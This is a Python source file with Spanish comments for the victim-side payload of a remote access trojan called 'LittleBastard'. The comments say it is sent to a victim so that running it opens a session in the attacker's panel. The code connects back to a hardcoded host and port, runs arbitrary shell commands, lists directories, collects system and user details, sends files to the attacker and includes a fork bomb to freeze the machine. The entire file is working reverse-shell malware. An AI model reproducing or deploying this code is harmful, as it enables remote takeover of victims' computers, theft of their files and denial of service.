#Este es el archivo que se le enviara a a la victima y al ejecutarlo, se abrirra una sesion en el panel de LittleBastard
#Creado Por Shadow :)
#No soy responsable del mal uso que usted pueda darle, porfavor sea legal!
import socket
import subprocess
import os
import platform
import getpass
import time
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()


RHOST = "192.168.0.61" #Cambia Esto!
RPORT = 4444 #Cambia esto!


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        sock.connect((RHOST, RPORT))
        break
    except:
        time.sleep(2)
         

while True:
    try:
         
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # Mira lo que hay en el directorio
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Haz que la ram se llene y el usuario no pueda hacer nada 
        if cmd == "kill_pc":
            while True:
                os.fork()

          

        # Cambia el directorio
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Directorio Cambiado ")

        
         
        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Systema Operativo: {platform.system()}
Nombre de la PC: {platform.node()}
Username: {getpass.getuser()}
Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Descarga Archivos
        elif cmd.split(" ")[0] == "descargar":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(3000)
                while file_data:
                    print("Descargando !", file_data)
                    sock.send(file_data)
                    file_data = f.read(3000)
                sleep(2)
                sock.send(b"Hecho")
            print("Proceso Terminado")

         

        

        # Termina la Conexion
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Otros comandos
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # Si se cierra la conexion
        if not cmd:
             
            break
    except Exception as e:
        sock.send("Directorio Cambiado! ".encode())

sock.close()

 